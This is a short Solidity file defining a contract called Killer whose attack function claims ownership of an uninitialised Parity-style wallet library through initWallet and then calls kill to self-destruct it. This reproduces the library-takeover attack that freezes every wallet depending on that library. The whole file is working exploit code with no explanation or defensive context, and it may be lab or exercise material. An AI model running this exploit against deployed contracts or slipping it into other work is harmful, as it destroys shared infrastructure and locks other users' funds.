// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./IParity.sol";

contract Killer {
    function attack(address target) external {
        IParity parity = IParity(target);

        address[] memory owners = new address[](1);
        owners[0] = address(this);
        parity.initWallet(owners, 0, 0);

        assert(parity.isOwner(address(this)));

        // Killing the library
        parity.kill(address(this));
    }
}
